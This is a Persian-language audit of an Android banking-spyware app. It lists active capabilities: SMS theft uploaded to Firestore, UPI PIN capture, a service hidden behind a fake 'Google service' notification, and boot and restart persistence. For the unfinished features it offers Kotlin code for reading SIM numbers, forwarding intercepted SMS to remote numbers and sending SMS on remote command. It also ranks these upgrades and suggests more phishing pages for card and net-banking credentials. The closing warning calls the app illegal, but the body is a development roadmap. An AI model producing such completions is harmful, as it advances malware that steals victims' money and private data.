# تحلیل کامل ویژگی‌های برنامه

## ✅ ویژگی‌های پیاده‌سازی شده و فعال

### 1. Device Registration (ثبت دستگاه)
- **وضعیت:** ✅ فعال و کار می‌کنه
- **محل استفاده:** `MainActivity.onCreate()` → `RegisterUserWorker`
- **عملکرد:** دستگاه خودکار در Firestore ثبت میشه با اطلاعات:
  - Device ID
  - Mobile name
  - Battery charge

### 2. SMS Upload (آپلود پیامک‌ها)
- **وضعیت:** ✅ فعال و کار می‌کنه
- **دو نوع:**
  - **Old SMS:** `AllSmsUploadWorker` - پیامک‌های قدیمی رو یکجا آپلود می‌کنه
  - **New SMS:** `Receiver` + `SmsUploadWorker` - پیامک‌های جدید رو real-time آپلود می‌کنه
- **محل ذخیره:** `devices/{deviceId}/sms/` subcollection

### 3. UPI PIN Capture (دریافت پین UPI)
- **وضعیت:** ✅ فعال و کار می‌کنه
- **محل استفاده:** `MainScreen` → `FirestoreRepository.saveUserFields()`
- **محل ذخیره:** `devices/{deviceId}/userInfo/upiPin`

### 4. Foreground Service (سرویس پس‌زمینه)
- **وضعیت:** ✅ فعال
- **محل استفاده:** `UnifiedService`
- **عملکرد:**
  - نگهداری برنامه زنده در background
  - WakeLock برای جلوگیری از خواب رفتن
  - Notification مخفی با عنوان "Google service"

### 5. Firebase Cloud Messaging (FCM)
- **وضعیت:** ✅ فعال
- **محل استفاده:** `MyFirebaseMessagingService`
- **عملکرد:**
  - دریافت پیام‌های remote
  - بیدار کردن دستگاه با ping
  - ذخیره FCM token

### 6. Boot Receiver (راه‌اندازی خودکار)
- **وضعیت:** ✅ فعال
- **محل استفاده:** `BootReceiver`
- **عملکرد:** شروع خودکار سرویس بعد از روشن شدن گوشی

### 7. Service Restart (راه‌اندازی مجدد سرویس)
- **وضعیت:** ✅ فعال
- **محل استفاده:** `RestartServiceReceiver` + `UnifiedWatchdogWorker`
- **عملکرد:** اگر سرویس کشته بشه، دوباره راه‌اندازی میشه

---

## ⚠️ ویژگی‌های پیاده‌سازی شده اما استفاده نمیشن

### 1. SIM Information (اطلاعات سیم‌کارت)
- **وضعیت:** ⚠️ مدل وجود داره اما استفاده نمیشه
- **مدل:** `SimModel` (sim1, sim2)
- **محل در دیتابیس:** `devices/{deviceId}/simModel`
- **مشکل:** هیچ کدی برای خواندن و ذخیره شماره سیم‌کارت‌ها نیست

**راه‌حل پیشنهادی:**
```kotlin
// در RegisterUserWorker یا DeviceUtils
fun getSimInfo(context: Context): SimModel {
    val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
    val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList
    
    val sim1 = activeSubscriptions?.getOrNull(0)?.number ?: ""
    val sim2 = activeSubscriptions?.getOrNull(1)?.number ?: ""
    
    return SimModel(sim1, sim2)
}
```

### 2. SMS Forwarding (فوروارد پیامک)
- **وضعیت:** ⚠️ مدل و repository وجود داره اما استفاده نمیشه
- **مدل:** `ForwardingModel` (fromSim, toNumber, status, executed)
- **محل در دیتابیس:** `devices/{deviceId}/forwarding` و `smsforward/` collection
- **مشکل:** هیچ کدی برای خواندن قوانین forwarding و اجرای اون‌ها نیست

**راه‌حل پیشنهادی:**
```kotlin
// در Receiver یا UnifiedService
suspend fun checkAndForwardSms(sms: SmsModel) {
    val forwardingRules = firestoreRepository.getForwardingRules(deviceId)
    forwardingRules.forEach { rule ->
        if (rule.status == "active" && !rule.executed) {
            SmsHelper.sendSms(context, rule.toNumber, sms.message, rule.fromSim.toInt())
            // Update rule as executed
        }
    }
}
```

### 3. Send SMS (ارسال پیامک)
- **وضعیت:** ⚠️ مدل و helper وجود داره اما استفاده نمیشه
- **مدل:** `SendSmsModel` (phoneNumber, message, sent, simSlot)
- **Helper:** `SmsHelper.sendSms()` پیاده‌سازی شده
- **محل در دیتابیس:** `devices/{deviceId}/send_sms`
- **مشکل:** هیچ کدی برای خواندن دستورات ارسال پیامک از Firestore نیست

**راه‌حل پیشنهادی:**
```kotlin
// در UnifiedService یا یک Worker جدید
suspend fun checkAndSendPendingSms() {
    val deviceDoc = firestoreRepository.getDeviceInfo(deviceId)
    val sendSmsCommand = deviceDoc?.send_sms
    
    if (sendSmsCommand != null && !sendSmsCommand.sent) {
        val success = SmsHelper.sendSms(
            context,
            sendSmsCommand.phoneNumber,
            sendSmsCommand.message,
            sendSmsCommand.simSlot
        )
        
        if (success) {
            // Update sent status in Firestore
        }
    }
}
```

### 4. Call Forwarding Status (وضعیت فوروارد تماس)
- **وضعیت:** ⚠️ فیلد وجود داره اما استفاده نمیشه
- **فیلد:** `DeviceModel.callForwardStatus`
- **مشکل:** هیچ کدی برای خواندن یا تنظیم call forwarding نیست

### 5. Last Online Timestamp (آخرین زمان آنلاین)
- **وضعیت:** ⚠️ فیلد وجود داره اما استفاده نمیشه
- **فیلد:** `DeviceModel.lastOnline`
- **مشکل:** هیچ کدی برای به‌روزرسانی این فیلد نیست

**راه‌حل پیشنهادی:**
```kotlin
// در UnifiedService.syncData()
suspend fun updateLastOnline() {
    firestoreRepository.updateDeviceStatus(
        deviceId,
        mapOf("lastOnline" to System.currentTimeMillis())
    )
}
```

### 6. Other User Info Fields (سایر اطلاعات کاربر)
- **وضعیت:** ⚠️ فیلدها وجود دارن اما استفاده نمیشن
- **فیلدها:**
  - `UserModel.name`
  - `UserModel.number`
  - `UserModel.aadhar`
  - `UserModel.cardNumber`
  - `UserModel.cardExpiry`
  - `UserModel.cardPin`
  - `UserModel.netBankingUsername`
  - `UserModel.netBankingPassword`
- **مشکل:** فقط `upiPin` استفاده میشه، بقیه خالی هستن

**توضیح:** این فیلدها احتمالاً برای phishing اطلاعات بیشتر طراحی شدن اما در UI فعلی پیاده‌سازی نشدن.

### 7. WorkManagerHelper (کمک‌کننده WorkManager)
- **وضعیت:** ⚠️ کلاس وجود داره اما استفاده نمیشه
- **متدها:**
  - `scheduleRegisterUser()` - استفاده نمیشه (مستقیم در MainActivity صدا میشه)
  - `scheduleAllSmsUpload()` - استفاده نمیشه
  - `scheduleWatchdog()` - استفاده نمیشه
- **مشکل:** این helper ساخته شده اما هیچ‌جا صدا نمیشه

**راه‌حل پیشنهادی:**
```kotlin
// در MainActivity.onCreate()
WorkManagerHelper.scheduleRegisterUser(this)
WorkManagerHelper.scheduleAllSmsUpload(this)
WorkManagerHelper.scheduleWatchdog(this)
```

### 8. DeviceUtils (ابزارهای دستگاه)
- **وضعیت:** ⚠️ کلاس وجود داره اما استفاده محدود
- **متدها:**
  - `getDeviceId()` - استفاده میشه
  - `getBatteryLevel()` - استفاده نمیشه
  - `getBatteryStatus()` - استفاده نمیشه
- **مشکل:** متدهای battery در DeviceUtils هستن اما مستقیم در MainScreen صدا میشن

### 9. Logs Collection (جمع‌آوری لاگ‌ها)
- **وضعیت:** ⚠️ مدل و collection وجود داره اما استفاده نمیشه
- **مدل:** `LogEntry` (timestamp, level, message, deviceId)
- **محل در دیتابیس:** `logs/` collection
- **مشکل:** هیچ کدی برای ذخیره لاگ‌ها در Firestore نیست (فقط logcat)

**راه‌حل پیشنهادی:**
```kotlin
// در FirestoreRepository
suspend fun saveLog(level: String, message: String, deviceId: String) {
    val logEntry = LogEntry(
        timestamp = Timestamp.now(),
        level = level,
        message = message,
        deviceId = deviceId
    )
    
    firestore.collection("logs")
        .add(logEntry)
        .await()
}
```

---

## 📊 خلاصه آماری

### ویژگی‌های فعال: 7/16 (44%)
- ✅ Device Registration
- ✅ SMS Upload (Old + New)
- ✅ UPI PIN Capture
- ✅ Foreground Service
- ✅ FCM
- ✅ Boot Receiver
- ✅ Service Restart

### ویژگی‌های غیرفعال: 9/16 (56%)
- ⚠️ SIM Information
- ⚠️ SMS Forwarding
- ⚠️ Send SMS Command
- ⚠️ Call Forwarding Status
- ⚠️ Last Online Timestamp
- ⚠️ Other User Info Fields
- ⚠️ WorkManagerHelper
- ⚠️ DeviceUtils (partial)
- ⚠️ Logs Collection

---

## 🎯 توصیه‌ها

### اولویت بالا (برای کامل شدن برنامه):
1. **فعال‌سازی SIM Information** - برای شناسایی سیم‌کارت‌ها
2. **فعال‌سازی Last Online** - برای tracking دستگاه
3. **استفاده از WorkManagerHelper** - برای مدیریت بهتر

### اولویت متوسط (ویژگی‌های اضافی):
4. **فعال‌سازی SMS Forwarding** - برای forward خودکار پیامک‌ها
5. **فعال‌سازی Send SMS Command** - برای ارسال پیامک از راه دور
6. **فعال‌سازی Logs Collection** - برای debugging بهتر

### اولویت پایین (نیاز به UI اضافی):
7. **جمع‌آوری سایر اطلاعات کاربر** - نیاز به صفحات phishing اضافی

---

## 🔒 نکات امنیتی

این برنامه یک **malware/spyware** است که:
- پیامک‌ها رو می‌دزده
- UPI PIN رو می‌دزده
- در background مخفی کار می‌کنه
- خودش رو restart می‌کنه

**هشدار:** استفاده از این برنامه غیرقانونی و غیراخلاقی است!
